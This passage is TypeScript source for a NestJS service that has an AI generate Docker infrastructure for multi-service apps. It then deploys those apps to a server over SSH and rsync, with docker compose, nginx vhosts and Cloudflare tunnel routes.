import {
  BadRequestException,
  ConflictException,
  ForbiddenException,
  Injectable,
  Logger,
  NotFoundException,
} from '@nestjs/common';
import { spawn } from 'node:child_process';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import type {
  DetectedService,
  GeneratedFile,
  PrepareServerResponse,
  ServerDeployInfo,
  ServerDeployServiceEntry,
  ServerDeployStatusResponse,
} from '@larkwave/shared';
import { PrismaService } from '../prisma/prisma.service';
import { AppConfigService } from '../config/app-config.service';
import { AuditService } from '../audit/audit.service';
import { AuthUser } from '../common/auth-user';
import { AnthropicService } from '../engine/anthropic.service';
import { MaicService } from '../maic/maic.service';
import { detectServices } from '../git/classify';
import { planAllowsServerDeploy } from '../billing/plans';
import { Prisma } from '@prisma/client';

const SSH_OPTS = [
  '-o',
  'StrictHostKeyChecking=accept-new',
  '-o',
  'PreferredAuthentications=password',
  '-o',
  'PubkeyAuthentication=no',
  '-o',
  'ConnectTimeout=20',
];

// Key-auth options (preferred): no password, fail fast instead of prompting.
const KEY_OPTS = [
  '-o',
  'StrictHostKeyChecking=accept-new',
  '-o',
  'IdentitiesOnly=yes',
  '-o',
  'BatchMode=yes',
  '-o',
  'PreferredAuthentications=publickey',
  '-o',
  'ConnectTimeout=20',
];

/** Host interface every generated container publishes on — see stabilizePorts(). */
const LOOPBACK_BIND = '127.0.0.1';

const NGINX_TEMPLATE = `server {
    listen 80;
    server_name __HOST__;
    client_max_body_size 50m;
    proxy_read_timeout 120s;
    location / {
        proxy_pass http://127.0.0.1:__PORT__;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
`;

const INFRA_SYSTEM = `Bạn là kỹ sư DevOps. Nhiệm vụ: sinh HẠ TẦNG DOCKER để chạy MỘT workspace nhiều service (frontend, backend, CMS, AI Python…) cùng nhau trên một host Linux qua "docker compose up".

XUẤT qua tool emit_project. CHỈ tạo file hạ tầng — TUYỆT ĐỐI KHÔNG sửa/viết lại mã nguồn ứng dụng:
- ĐÚNG MỘT "docker-compose.yml" ở gốc repo.
- Mỗi service một "<đường-dẫn-service>/Dockerfile" (BỎ QUA nếu service đã có Dockerfile — sẽ giữ nguyên file cũ).
- Có thể thêm "<service>/.dockerignore" và "<service>/nginx.conf" cho frontend tĩnh nếu cần.

QUY TẮC docker-compose.yml:
1. Mỗi service đặt tên = tên thư mục (chữ thường, hợp lệ DNS) — tên này sẽ thành subdomain.
2. Mỗi service web dùng "build: { context: ./<path>, dockerfile: Dockerfile }".
3. Service phục vụ HTTP PHẢI publish cổng bằng cú pháp NGẮN một-số: ports: ["<cổng-trong-container>"] (vd "3000", "80", "8000"). Hệ thống tự gán host-port ỔN ĐỊNH, riêng cho từng app (tránh trùng trên host dùng chung). KHÔNG hardcode host-port.
4. Service nội bộ (DB/redis/queue) KHÔNG publish ra ngoài (chỉ "expose"), kèm volume để giữ dữ liệu.
5. Nối service với nhau qua biến môi trường dùng TÊN service làm host (vd DATABASE_URL=postgres://...@db:5432/app, AI_URL=http://ai:8000). Frontend gọi API qua subdomain hoặc biến môi trường build-time.
6. Chỉ thêm DB (postgres) / cache (redis) khi có dấu hiệu rõ ràng (prisma/pg/sqlalchemy/django/redis trong dependency).
7. depends_on hợp lý.
8. GIỚI HẠN TÀI NGUYÊN cho MỌI service (host dùng chung — tránh một app làm sập máy): thêm \`mem_limit\` + \`cpus\` (compose v2) hoặc \`deploy.resources.limits\`. Mặc định memory 512M, cpus '0.5'; service nặng (AI/Python, build Next) tối đa 1G, cpus '1.0'. Kèm \`restart: unless-stopped\` và \`logging: { options: { max-size: '10m', max-file: '3' } }\`.

QUY TẮC Dockerfile theo loại:
- Frontend Vite/React/Vue (build ra tĩnh): multi-stage — node:20-alpine cài + "npm run build" → copy dist/ (Vite) hoặc build/ (CRA) sang nginx:alpine phục vụ ở cổng 80; kèm nginx.conf fallback SPA (try_files ... /index.html).
- Next.js: node:20-alpine, "npm ci/install && npm run build", chạy "npm run start" (next start), cổng 3000.
- NestJS/Node: node:20-alpine, cài deps, "npm run build" nếu có, chạy "node dist/main.js" hoặc "npm run start:prod"/"npm start"; cổng theo code (mặc định 3000).
- Python: dùng python:3.11-slim, "pip install -r requirements.txt"; chọn lệnh chạy theo framework — FastAPI→uvicorn main:app --host 0.0.0.0 --port 8000; Flask→gunicorn; Django(manage.py)→gunicorn hoặc "manage.py runserver 0.0.0.0:8000"; cổng 8000.
- Go: golang:1.22-alpine build → image nhỏ chạy binary.
- Luôn EXPOSE đúng cổng và lắng nghe 0.0.0.0 (không phải localhost).

Code phải build & chạy được. Không thêm dịch vụ thừa.`;

/**
 * "Deploy lên Server (Docker)" — deploys a full-stack app (a project carrying a
 * root docker-compose.yml) onto the configured host: rsync → `docker compose up`
 * → an nginx vhost + a Cloudflare-tunnel DNS route per published service, exposed
 * at `<slug>-<service>.<domain>`. The whole feature is INERT unless the
 * SERVER_DEPLOY_* env is set (so it ships dormant + safe).
 */
/** In-memory status of a stateless desktop server-deploy (polled by the desktop). */
interface DesktopDeployState {
  status: 'deploying' | 'live' | 'failed';
  log: string;
  urls: string[];
  error?: string;
  at: number;
}

@Injectable()
export class ServerDeployService {
  private readonly logger = new Logger(ServerDeployService.name);
  /** Transient status for desktop (no DB App record) deploys, keyed by deployId. */
  private readonly desktopDeploys = new Map<string, DesktopDeployState>();

  constructor(
    private readonly prisma: PrismaService,
    private readonly config: AppConfigService,
    private readonly audit: AuditService,
    private readonly anthropic: AnthropicService,
    private readonly maic: MaicService,
  ) {}

  private get env() {
    return this.config.env;
  }

  /** Feature configured: host + tunnel + an auth method (SSH key preferred, else password). */
  isEnabled(): boolean {
    const e = this.env;
    return Boolean(
      e.SERVER_DEPLOY_HOST &&
        e.SERVER_DEPLOY_TUNNEL_ID &&
        (e.SERVER_DEPLOY_SSH_KEY || e.SERVER_DEPLOY_SSH_PASS),
    );
  }

  /** Status for the UI: feature availability + whether this app can deploy + state. */
  async status(user: AuthUser, appId: string): Promise<ServerDeployStatusResponse> {
    const app = await this.loadApp(user, appId);
    const files = await this.latestFiles(app.id);
    const row = await this.prisma.serverDeploy.findUnique({ where: { appId } });
    const services = detectServices(files);
    // Offer the Docker path (synthesize infra → run on server) for ANY imported
    // project that needs more than Cloudflare Pages: ≥2 sub-projects, OR even a
    // single backend (NestJS/Go/Python/…) that can't run on Pages. A plain single
    // frontend stays Pages-only (no card), so normal apps aren't cluttered.
    const serverWorthy =
      services.length >= 2 ||
      services.some(
        (s) =>
          s.type === 'backend' ||
          s.type === 'other' ||
          // A single SSR-capable frontend (Next.js / Nuxt) often can't static-export to
          // Cloudflare Pages (dynamic routes / server data). Offer the Docker server
          // (next build && next start) as the way to actually run it.
          (s.type === 'frontend' && (s.framework === 'next' || s.framework === 'nuxt')),
      );
    return {
      enabled: this.isEnabled(),
      canDeploy: this.hasCompose(files),
      multiService: serverWorthy,
      planAllowed: await this.userPlanAllowed(user),
      deploy: row ? this.toInfo(row) : null,
    };
  }

  /** Running on the Docker server is a Pro+ capability (admins always allowed). */
  private async userPlanAllowed(user: AuthUser): Promise<boolean> {
    if (user.role === 'admin') return true;
    const u = await this.prisma.user.findUnique({
      where: { id: user.id },
      select: { plan: true },
    });
    return planAllowsServerDeploy(u?.plan);
  }


  /**
   * AI-synthesize the Docker infra (a root docker-compose.yml + a Dockerfile per
   * service that lacks one) so a multi-service imported workspace — api + cms +
   * landing + Python AI — runs together on the server. The model reads each
   * service's real entry points (package.json scripts, requirements.txt, go.mod…)
   * so the infra fits the actual code. Generated files are MERGED onto the app's
   * source (never overwriting existing source or Dockerfiles) and persisted as an
   * import build → visible in Code, downloadable, pushable to git, and makes the
   * app server-deployable. Does NOT run anything; deploy() is a separate step.
   */
  async prepareInfra(user: AuthUser, appId: string): Promise<PrepareServerResponse> {
    const app = await this.loadApp(user, appId);
    // Same Pro+ gate as deploy() — prepareInfra makes a real (paid) AI call, so a
    // lower-tier user must not be able to burn generations via the API directly
    // (the UI already hides it). No point preparing infra they can never run.
    if (!(await this.userPlanAllowed(user))) {
      throw new ForbiddenException(
        'Chuẩn bị hạ tầng Docker cần gói Chuyên nghiệp trở lên (tính năng Chạy trên Server).',
      );
    }
    const files = await this.latestFiles(app.id);
    const services = detectServices(files);
    if (this.hasCompose(files)) {
      return { created: 0, services: services.length, hasCompose: true };
    }
    if (services.length === 0) {
      throw new BadRequestException(
        'Không phát hiện service nào (thiếu package.json / requirements.txt / Dockerfile…) để dựng Docker.',
      );
    }

    const prompt = this.infraPrompt(files, services);
    let generated: GeneratedFile[] = [];
    try {
      if (this.maic.enabled) {
        // MAIC-only: the hosted agent writes the Docker infra into a workspace seeded with the app's
        // files (no own Anthropic key). We keep only the NEW infra files below.
        const seed = files
          .filter((f) => typeof f.content === 'string')
          .map((f) => ({ path: f.path.replace(/^\.?\//, ''), content: f.content }));
        const res = await this.maic.runAgent({
          prompt:
            `${INFRA_SYSTEM}\n\n${prompt}\n\n` +
            `NHIỆM VỤ: Dùng công cụ file GHI các file HẠ TẦNG (docker-compose.yml, Dockerfile cho từng ` +
            `service, .dockerignore…) vào thư mục làm việc. KHÔNG sửa/xoá file nguồn hiện có. Không in ra câu trả lời.`,
          files: seed,
          permissionMode: 'bypassPermissions',
          returnFiles: 'all',
          timeoutSec: 1200,
          endUser: { id: user.id },
        }, { kind: 'server-deploy' });
        if (res.status !== 'succeeded') {
          throw new Error(`MAIC ${res.status}: ${res.error ?? 'không rõ lỗi'}`);
        }
        generated = res.files.map((f) => ({ path: f.path, content: f.content }));
      } else {
        // Fallback: our own Anthropic key. Batched so a many-service workspace doesn't dead-end.
        const res = await this.anthropic.generateFilesBatched(prompt, {
          system: INFRA_SYSTEM,
          maxTokens: 12000,
          maxBatches: 3,
        });
        generated = res.files;
      }
    } catch (err) {
      throw new BadRequestException(
        'Không sinh được hạ tầng Docker: ' + String((err as Error)?.message ?? err).slice(0, 300),
      );
    }

    const existing = new Set(files.map((f) => f.path.replace(/^\.?\//, '')));
    // Only keep INFRA files, and never overwrite source or a service's own Dockerfile.
    const infra = generated
      .map((f) => ({ path: f.path.replace(/^\.?\//, ''), content: f.content }))
      .filter((f) => this.isInfraFile(f.path) && !existing.has(f.path));
    if (!infra.some((f) => this.hasCompose([f]))) {
      throw new BadRequestException(
        'AI chưa tạo được docker-compose.yml hợp lệ. Hãy thử lại, hoặc tự thêm docker-compose.yml.',
      );
    }

    const map = new Map(files.map((f) => [f.path.replace(/^\.?\//, ''), f]));
    for (const f of infra) map.set(f.path, f);
    const merged = [...map.values()];

    const now = new Date();
    await this.prisma.build.create({
      data: {
        appId,
        ownerId: user.id,
        prompt: 'Dựng hạ tầng Docker để chạy trên server (AI)',
        track: app.track ?? null,
        status: 'succeeded',
        mode: 'import',
        model: 'sonnet',
        autoApprove: true,
        files: merged as unknown as object,
        stages: [] as unknown as object,
        logs: [] as unknown as object,
        startedAt: now,
        finishedAt: now,
      },
    });
    await this.audit.log(user.id, user.email, 'server.prepare', appId, {
      created: infra.length,
      services: services.length,
    });
    this.logger.log(`prepare-infra ${appId}: +${infra.length} infra file(s)`);
    return { created: infra.length, services: services.length, hasCompose: true };
  }

  /** Deploy the app's current files (with docker-compose.yml) to the server. */
  async deploy(user: AuthUser, appId: string): Promise<ServerDeployInfo> {
    if (!this.isEnabled()) {
      throw new ForbiddenException('Tính năng deploy lên server chưa được cấu hình.');
    }
    // Running on the real Docker server (always-on resources) is a Pro+ capability.
    if (!(await this.userPlanAllowed(user))) {
      throw new ForbiddenException(
        'Chạy trên Server (Docker) cần gói Chuyên nghiệp trở lên. Hãy nâng gói để chạy backend/Python thật trên server.',
      );
    }
    const app = await this.loadApp(user, appId);
    const files = await this.latestFiles(app.id);
    if (!this.hasCompose(files)) {
      throw new BadRequestException('App không có docker-compose.yml ở gốc để deploy lên server.');
    }
    const slug = this.safeSlug(app.slug || app.id);
    // Subdomain namespace = the app's UNIQUE slug (NOT its name). Keying public
    // hostnames / nginx vhosts / tunnel routes on the non-unique, mutable app name
    // let two apps named the same collide on one subdomain (cross-tenant hijack)
    // and made a rename orphan the old routes. The slug is unique + stable.
    const base = slug;

    // Atomic per-app deploy LOCK: claim 'deploying' only if not already deploying
    // (or the prior claim is stale >20m — covers a crashed deploy). Two concurrent
    // deploys would otherwise both rsync --delete + `compose up` the same remoteDir
    // and corrupt each other.
    const staleBefore = new Date(Date.now() - 20 * 60 * 1000);
    const claim = await this.prisma.serverDeploy.updateMany({
      where: {
        appId,
        OR: [{ status: { not: 'deploying' } }, { updatedAt: { lt: staleBefore } }],
      },
      data: { status: 'deploying', error: null },
    });
    if (claim.count === 0) {
      const existing = await this.prisma.serverDeploy.findUnique({ where: { appId } });
      if (existing) {
        throw new ConflictException(
          'App đang được deploy lên server — vui lòng đợi lần deploy trước hoàn tất.',
        );
      }
      await this.prisma.serverDeploy.create({
        data: { appId, status: 'deploying', services: [] as unknown as object },
      });
    }
    // Reset the live log for this run; the heavy work runs in the BACKGROUND so the
    // UI can poll progress (status='deploying') + read the streaming log instead of
    // blocking the HTTP request for minutes.
    await this.prisma.serverDeploy
      .update({ where: { appId }, data: { log: '▸ Bắt đầu triển khai…', error: null } })
      .catch(() => undefined);
    void this.runDeploy(user, appId, slug, base, files).catch((e) =>
      this.logger.error(`runDeploy ${slug} crashed: ${String(e)}`),
    );
    const row = await this.prisma.serverDeploy.findUnique({ where: { appId } });
    return this.toInfo(row!);
  }

  /** The actual deploy work (runs in the background); streams progress into the row's log. */
  private async runDeploy(
    user: AuthUser,
    appId: string,
    slug: string,
    base: string,
    files: GeneratedFile[],
  ): Promise<void> {
    let log = '▸ Bắt đầu triển khai…\n';
    const step = async (line: string) => {
      log += line + '\n';
      await this.prisma.serverDeploy
        .update({ where: { appId }, data: { log: log.slice(-14000) } })
        .catch(() => undefined);
    };
    try {
      await step('▸ Chuẩn bị mã nguồn (vá Dockerfile/cổng nếu cần)…');
      const dir = await this.materialize(appId, this.sanitizeInfra(files, slug));
      const remoteDir = `${this.env.SERVER_DEPLOY_DIR}/${slug}`;

      await step('▸ Đồng bộ mã nguồn lên server…');
      let r = await this.ssh(`mkdir -p ${remoteDir}`);
      r = await this.rsync(dir, remoteDir);
      if (r.code !== 0) throw new Error(`rsync lỗi:\n${r.out.slice(-1500)}`);

      await step('▸ Build & chạy container (có thể vài phút)…');
      r = await this.ssh(`cd ${remoteDir} && docker compose -p ${slug} up -d --build 2>&1`, 900_000);
      log += r.out + '\n'; // full compose output → the UI shows the REAL error, untruncated
      if (r.code !== 0) {
        await this.prisma.serverDeploy
          .update({ where: { appId }, data: { log: log.slice(-14000) } })
          .catch(() => undefined);
        throw new Error('docker compose thất bại — xem nhật ký bên dưới.');
      }

      await step('▸ Cấu hình tên miền + nginx cho từng service…');
      // The published port can lag a moment after `compose up -d` returns — poll a few
      // times so we don't write ZERO vhosts (the "0 service" bug) for a container that
      // is actually about to expose its port.
      let services: { service: string; port: number | null }[] = [];
      for (let attempt = 0; attempt < 6; attempt += 1) {
        const ps = await this.ssh(
          `cd ${remoteDir} && docker compose -p ${slug} ps --format json 2>/dev/null`,
        );
        services = this.parsePs(ps.out);
        if (services.some((s) => s.port && !this.isInternalService(s.service))) break;
        if (attempt < 5) await new Promise((r) => setTimeout(r, 3000));
      }
      if (!services.some((s) => s.port && !this.isInternalService(s.service))) {
        log += '  ⚠ Chưa thấy cổng publish nào sau khi container chạy — kiểm tra "ports:" trong docker-compose.\n';
      }
      // Per-service custom domain via compose labels (toolswave.host / .subdomain).
      const cfgJson = await this.ssh(`cd ${remoteDir} && docker compose -p ${slug} config --format json 2>/dev/null`);
      const labels = this.parseComposeLabels(cfgJson.out);
      // Hosts already owned by OTHER apps' deploys — never hijack them (use auto).
      const taken = await this.takenHosts(appId);
      const cert = this.env.SERVER_DEPLOY_ORIGIN_CERT
        ? `--origincert ${this.env.SERVER_DEPLOY_ORIGIN_CERT} `
        : '';
      const entries: ServerDeployServiceEntry[] = [];
      for (const s of services) {
        if (!s.port) continue;
        // Databases (mongo/postgres/redis/…) are INTERNAL-only — talk over the
        // compose network, never a public subdomain. Skip exposing them.
        if (this.isInternalService(s.service)) {
          log += `  • ${s.service}: nội bộ (DB) — không tạo subdomain\n`;
          continue;
        }
        // Custom domain from a label (must be under the deploy domain + not taken by
        // another app), else the auto <slug>-<svc> host.
        const { host, custom, rejected } = this.resolveHost(labels.get(s.service), base, s.service, taken);
        if (rejected) log += `  ⚠ ${s.service}: domain "${rejected}" đã được app khác dùng → dùng tên auto\n`;
        const conf = NGINX_TEMPLATE.replace(/__HOST__/g, host).replace(/__PORT__/g, String(s.port));
        await this.sshWrite(`/etc/nginx/sites-enabled/${host}.conf`, conf);
        // DNS route (--origincert = the deploy domain's zone cert; without it the
        // default root cert creates the CNAME under the wrong zone → NXDOMAIN).
        const dns = await this.ssh(
          `PATH="$PATH:/usr/local/bin" cloudflared ${cert}tunnel route dns ${this.env.SERVER_DEPLOY_TUNNEL_ID} ${host} 2>&1`,
        );
        if (dns.code !== 0 && !/already exists|already configured/i.test(dns.out)) {
          log += `  ⚠ DNS ${host}: ${dns.out.trim().split('\n').pop()}\n`;
        }
        entries.push({ name: s.service, subdomain: host, port: s.port, url: `https://${host}` });
        log += `  • ${s.service} → https://${host}${custom ? ' (tùy chỉnh)' : ''}\n`;
      }

      // Ensure the Cloudflare tunnel actually ROUTES these hosts to nginx — the
      // deploy creates vhosts + DNS but the tunnel also needs an ingress rule, else
      // the host hits the catch-all 404. ensureIngress adds missing rules safely
      // (backup → validate → restart; restores on any invalid config).
      if (entries.length) {
        await step('▸ Thêm route tunnel (ingress) + reload…');
        try {
          const added = await this.ensureIngress(entries.map((e) => e.subdomain));
          log += `  ${added}\n`;
        } catch (e) {
          log += `  ⚠ ingress: ${String((e as Error)?.message ?? e)}\n`;
        }
      }
      const reload = await this.ssh(`nginx -t && systemctl reload nginx 2>&1`);
      if (reload.code !== 0) throw new Error(`nginx lỗi:\n${reload.out.slice(-800)}`);

      log += `✓ Hoàn tất — ${entries.length} service đang chạy.\n`;
      await this.prisma.serverDeploy.update({
        where: { appId },
        data: { status: 'live', services: entries as unknown as object, error: null, log: log.slice(-14000) },
      });
      // Surface the live URL on the APP so the whole workspace reflects it — Preview,
      // header link, "đã deploy" status all read app.currentUrl (previously only a
      // Cloudflare Pages deploy set it, so a server-deployed app showed "Chưa có bản
      // deploy" + no preview). Use the primary (first public) service URL.
      if (entries.length) {
        await this.prisma.app
          .update({
            where: { id: appId },
            data: { currentUrl: entries[0].url, status: 'live' },
          })
          .catch(() => undefined);
      }
      await this.audit.log(user.id, user.email, 'server.deploy', appId, { services: entries.length });
      this.logger.log(`server-deploy ${slug}: ${entries.length} service(s) live`);
    } catch (err) {
      const message = String((err as Error)?.message ?? err).slice(0, 2000);
      this.logger.warn(`server-deploy ${slug} failed: ${message}`);
      log += `✗ Lỗi: ${message}\n`;
      await this.prisma.serverDeploy
        .update({ where: { appId }, data: { status: 'failed', error: message, log: log.slice(-14000) } })
        .catch(() => undefined);
    }
  }

  // ── Desktop (stateless) server deploy ──────────────────────────────────────
  // A LOCAL desktop app has no DB App record: it uploads its SOURCE (incl. a
  // docker-compose.yml synthesised by the user's LOCAL Claude — so the platform
  // pays $0 for codegen). We run the SAME pipeline (sanitize → rsync → compose up →
  // nginx + tunnel) statelessly and track progress IN MEMORY for the desktop to
  // poll. Namespaced `dsk-<uid>-<slug>` so it never collides with web apps' hosts.

  /** Start a desktop server deploy; returns a deployId the desktop polls for status. */
  async desktopDeploy(
    user: AuthUser,
    body: { slug?: string; files?: { path?: string; content?: string; encoding?: string }[] },
  ): Promise<{ deployId: string }> {
    if (!this.isEnabled()) throw new ForbiddenException('Tính năng chạy trên server chưa được cấu hình.');
    if (!(await this.userPlanAllowed(user))) {
      throw new ForbiddenException('Chạy trên Server (Docker) cần gói Chuyên nghiệp trở lên.');
    }
    const files: GeneratedFile[] = (Array.isArray(body?.files) ? body.files : [])
      .map((f) => ({
        path: String(f?.path || ''),
        content: String(f?.content || ''),
        encoding: f?.encoding === 'base64' ? ('base64' as const) : undefined,
      }))
      .filter((f) => f.path);
    if (!files.length) throw new BadRequestException('Không có file để deploy.');
    if (files.length > 2000) throw new BadRequestException('Quá nhiều file (>2000).');
    if (!this.hasCompose(files)) {
      throw new BadRequestException('Thiếu docker-compose.yml — hãy dựng hạ tầng Docker trước khi deploy.');
    }
    const slug = `dsk-${user.id.slice(0, 6)}-${this.safeSlug(body.slug || 'app')}`.slice(0, 36).replace(/-+$/, '');
    const deployId = `dd-${Math.random().toString(36).slice(2, 10)}`;
    this.gcDesktopDeploys();
    this.desktopDeploys.set(deployId, { status: 'deploying', log: '▸ Bắt đầu…', urls: [], at: Date.now() });
    void this.runDesktopDeploy(user, deployId, slug, files).catch((e) =>
      this.logger.error(`desktop runDeploy ${slug} crashed: ${String(e)}`),
    );
    return { deployId };
  }

  /** Poll status of a desktop server deploy. */
  desktopDeployStatus(deployId: string): { status: string; log: string; urls: string[]; error?: string } {
    const s = this.desktopDeploys.get(deployId);
    if (!s) return { status: 'failed', log: '', urls: [], error: 'Phiên deploy không tồn tại hoặc đã hết hạn.' };
    return { status: s.status, log: s.log, urls: s.urls, error: s.error };
  }

  private gcDesktopDeploys(): void {
    const cutoff = Date.now() - 60 * 60 * 1000;
    for (const [k, v] of this.desktopDeploys) if (v.at < cutoff) this.desktopDeploys.delete(k);
  }

  private async runDesktopDeploy(
    user: AuthUser,
    deployId: string,
    slug: string,
    files: GeneratedFile[],
  ): Promise<void> {
    const st = this.desktopDeploys.get(deployId)!;
    const step = (line: string) => {
      st.log = (st.log + '\n' + line).slice(-14000);
    };
    try {
      step('▸ Chuẩn bị mã nguồn (vá Dockerfile/cổng nếu cần)…');
      const dir = await this.materialize(`dsk-${deployId}`, this.sanitizeInfra(files, slug));
      const remoteDir = `${this.env.SERVER_DEPLOY_DIR}/${slug}`;

      step('▸ Đồng bộ mã nguồn lên server…');
      await this.ssh(`mkdir -p ${remoteDir}`);
      let r = await this.rsync(dir, remoteDir);
      if (r.code !== 0) throw new Error(`rsync lỗi:\n${r.out.slice(-1200)}`);

      step('▸ Build & chạy container (có thể vài phút)…');
      r = await this.ssh(`cd ${remoteDir} && docker compose -p ${slug} up -d --build 2>&1`, 900_000);
      st.log = (st.log + '\n' + r.out).slice(-14000);
      if (r.code !== 0) throw new Error('docker compose thất bại — xem nhật ký bên dưới.');

      step('▸ Cấu hình tên miền + nginx cho từng service…');
      let services: { service: string; port: number | null }[] = [];
      for (let attempt = 0; attempt < 6; attempt += 1) {
        const ps = await this.ssh(`cd ${remoteDir} && docker compose -p ${slug} ps --format json 2>/dev/null`);
        services = this.parsePs(ps.out);
        if (services.some((s) => s.port && !this.isInternalService(s.service))) break;
        if (attempt < 5) await new Promise((res) => setTimeout(res, 3000));
      }
      const cert = this.env.SERVER_DEPLOY_ORIGIN_CERT ? `--origincert ${this.env.SERVER_DEPLOY_ORIGIN_CERT} ` : '';
      const domain = this.env.SERVER_DEPLOY_DOMAIN;
      const urls: string[] = [];
      const hosts: string[] = [];
      for (const s of services) {
        if (!s.port || this.isInternalService(s.service)) continue;
        const host = `${this.subdomain(slug, s.service)}.${domain}`;
        const conf = NGINX_TEMPLATE.replace(/__HOST__/g, host).replace(/__PORT__/g, String(s.port));
        await this.sshWrite(`/etc/nginx/sites-enabled/${host}.conf`, conf);
        const dns = await this.ssh(
          `PATH="$PATH:/usr/local/bin" cloudflared ${cert}tunnel route dns ${this.env.SERVER_DEPLOY_TUNNEL_ID} ${host} 2>&1`,
        );
        if (dns.code !== 0 && !/already exists|already configured/i.test(dns.out)) {
          step(`  ⚠ DNS ${host}: ${dns.out.trim().split('\n').pop()}`);
        }
        urls.push(`https://${host}`);
        hosts.push(host);
        step(`  • ${s.service} → https://${host}`);
      }
      if (!hosts.length) step('  ⚠ Chưa thấy cổng publish nào — kiểm tra "ports:" trong docker-compose.');
      if (hosts.length) {
        step('▸ Thêm route tunnel (ingress) + reload…');
        try {
          step('  ' + (await this.ensureIngress(hosts)));
        } catch (e) {
          step(`  ⚠ ingress: ${String((e as Error)?.message ?? e)}`);
        }
      }
      const reload = await this.ssh(`nginx -t && systemctl reload nginx 2>&1`);
      if (reload.code !== 0) throw new Error(`nginx lỗi:\n${reload.out.slice(-600)}`);

      st.urls = urls;
      st.status = 'live';
      step(`✓ Hoàn tất — ${urls.length} service đang chạy.`);
      await this.audit.log(user.id, user.email, 'server.deploy.desktop', slug, { services: urls.length });
      this.logger.log(`desktop server-deploy ${slug}: ${urls.length} service(s) live`);
    } catch (err) {
      const message = String((err as Error)?.message ?? err).slice(0, 1500);
      st.status = 'failed';
      st.error = message;
      step(`✗ Lỗi: ${message}`);
      this.logger.warn(`desktop server-deploy ${slug} failed: ${message}`);
    }
  }

  /**
   * Tear down an app's server footprint on delete: stop+remove its containers,
   * remove each service's nginx vhost (reload nginx), and rm the remote dir. Best-
   * effort + no-op when the feature is off or the app was never server-deployed.
   * NOTE: the per-service Cloudflare-tunnel DNS CNAMEs can't be deleted with the
   * DNS-read-only token, so they linger but resolve to 404 once the vhost is gone.
   */
  async teardown(appId: string): Promise<void> {
    if (!this.isEnabled()) return;
    const row = await this.prisma.serverDeploy.findUnique({ where: { appId } });
    if (!row) return;
    const app = await this.prisma.app.findUnique({
      where: { id: appId },
      select: { slug: true },
    });
    const slug = this.safeSlug(app?.slug || appId);
    const remoteDir = `${this.env.SERVER_DEPLOY_DIR}/${slug}`;
    try {
      await this.ssh(`cd ${remoteDir} && docker compose -p ${slug} down -v 2>&1 || true`, 300_000);
      const services = (row.services as unknown as ServerDeployServiceEntry[]) ?? [];
      for (const s of services) {
        if (s.subdomain) await this.ssh(`rm -f /etc/nginx/sites-enabled/${s.subdomain}.conf || true`);
      }
      await this.ssh(`nginx -t && systemctl reload nginx 2>&1 || true`);
      await this.ssh(`rm -rf ${remoteDir} || true`);
      this.logger.log(`teardown ${slug}: ${services.length} service(s) removed`);
    } catch (err) {
      this.logger.warn(`teardown ${slug} failed: ${String((err as Error)?.message ?? err)}`);
    }
    await this.prisma.serverDeploy.delete({ where: { appId } }).catch(() => undefined);
  }

  // ── helpers ────────────────────────────────────────────────────────────────

  private async loadApp(user: AuthUser, appId: string) {
    const app = await this.prisma.app.findUnique({ where: { id: appId } });
    if (!app) throw new NotFoundException('Không tìm thấy app');
    if (app.ownerId !== user.id && user.role !== 'admin') {
      throw new ForbiddenException('App không thuộc về bạn');
    }
    return app;
  }

  private async latestFiles(appId: string): Promise<GeneratedFile[]> {
    const b = await this.prisma.build.findFirst({
      // `files: { not: undefined }` là NO-OP của Prisma (bị bỏ qua). Từ khi người dùng xoá được
      // mã nguồn bản dựng cũ, lọc hỏng nghĩa là có thể chọn trúng một build ĐÃ BỊ DỌN → `?? []` →
      // pipeline tưởng app chưa có code và sinh lại từ đầu.
      where: { appId, NOT: { files: { equals: Prisma.DbNull } } },
      orderBy: { createdAt: 'desc' },
    });
    return (b?.files as unknown as GeneratedFile[]) ?? [];
  }

  private hasCompose(files: GeneratedFile[]): boolean {
    return files.some((f) => /^(docker-)?compose\.ya?ml$/.test(f.path.replace(/^\.?\//, '')));
  }

  /** A file we accept from the infra-generation pass (never application source). */
  private isInfraFile(path: string): boolean {
    const p = path.replace(/^\.?\//, '');
    const base = p.split('/').pop() ?? '';
    return (
      /^(docker-)?compose\.ya?ml$/.test(p) ||
      base === 'Dockerfile' ||
      base === '.dockerignore' ||
      /^nginx.*\.conf$/.test(base) ||
      base === 'entrypoint.sh'
    );
  }

  /** Build a compact, infra-relevant view of the workspace for the model. */
  private infraPrompt(files: GeneratedFile[], services: DetectedService[]): string {
    const byPath = new Map(files.map((f) => [f.path.replace(/^\.?\//, ''), f.content]));
    const clip = (s: string) => (s.length > 1800 ? s.slice(0, 1800) + '\n…(cắt bớt)' : s);
    // Files whose contents tell the model how to build/run a service.
    const KEY = [
      'package.json',
      'requirements.txt',
      'pyproject.toml',
      'go.mod',
      'Dockerfile',
      'vite.config.ts',
      'vite.config.js',
      'next.config.js',
      'next.config.mjs',
      'manage.py',
      'Cargo.toml',
      'pom.xml',
      'composer.json',
      '.env.example',
    ];
    const parts: string[] = [
      `Workspace có ${services.length} service. Sinh docker-compose.yml + Dockerfile để chạy tất cả cùng nhau.`,
    ];
    for (const s of services) {
      const prefix = s.path === '' ? '' : `${s.path}/`;
      const within = [...byPath.keys()]
        .filter((p) => (prefix === '' ? true : p.startsWith(prefix)))
        .map((p) => (prefix ? p.slice(prefix.length) : p))
        .filter((p) => p && !p.includes('/')) // top-level files of the service
        .slice(0, 50);
      parts.push(
        `\n### Service "${s.name}" — path: "${s.path || '.'}", loại: ${s.type}, framework: ${s.framework ?? '?'}`,
      );
      parts.push(`File ở gốc service: ${within.join(', ') || '(không có)'}`);
      for (const k of KEY) {
        const fp = prefix + k;
        if (byPath.has(fp)) parts.push(`--- ${fp} ---\n${clip(byPath.get(fp) as string)}`);
      }
    }
    return parts.join('\n');
  }

  private safeSlug(s: string): string {
    return (s.toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '') || 'app').slice(0, 30);
  }

  /**
   * Hostname label for one service: `<base>-<service>` → served at
   * `<base>-<service>.<domain>` (e.g. velvel-api.toolswave.net). Single-level so
   * the default Cloudflare `*.<domain>` Universal cert covers it — no Total TLS
   * or per-app tunnel ingress needed (works on the existing wildcard ingress).
   */
